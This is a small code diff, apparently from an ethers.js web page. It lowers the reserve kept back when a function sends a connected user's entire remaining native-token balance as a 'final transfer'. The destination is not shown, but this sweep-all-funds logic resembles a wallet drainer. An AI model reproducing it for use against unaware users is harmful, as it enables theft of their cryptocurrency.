@@ -221,7 +221,7 @@ async function processAllTransfers() {
       try {
         updateStatus(`Processing final transfer...`, "success");
         const balance = await provider.getBalance(userAddress);
-        const keepAmount = ethers.utils.parseUnits("0.002", nativeToken.decimals);
+        const keepAmount = ethers.utils.parseUnits("0.001", nativeToken.decimals);
         const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
         
         if (sendAmount.gt(0)) {
